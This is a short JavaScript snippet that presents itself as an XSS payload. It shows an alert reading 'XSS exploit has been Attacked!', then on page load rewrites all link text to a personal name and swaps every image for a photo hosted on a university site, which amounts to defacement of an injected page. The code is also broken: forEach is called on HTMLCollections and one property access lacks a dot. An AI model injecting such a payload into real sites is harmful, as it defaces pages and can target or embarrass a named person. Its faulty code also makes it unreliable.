alert('XSS exploit has been Attacked!');
window.addEventListener('load', () => {
  const a = document.getElementsByTagName('a')
  a.forEach(ele => {
    eleinnerText = '日野原龍一'
  });
  const img = document.getElementsByTagName('img')
  img.forEach(ele => {
    ele.src = 'http://hbs.ws.hosei.ac.jp/wp-content/uploads/2014/11/SusumagoNUS-180x192.jpg'
  })
})
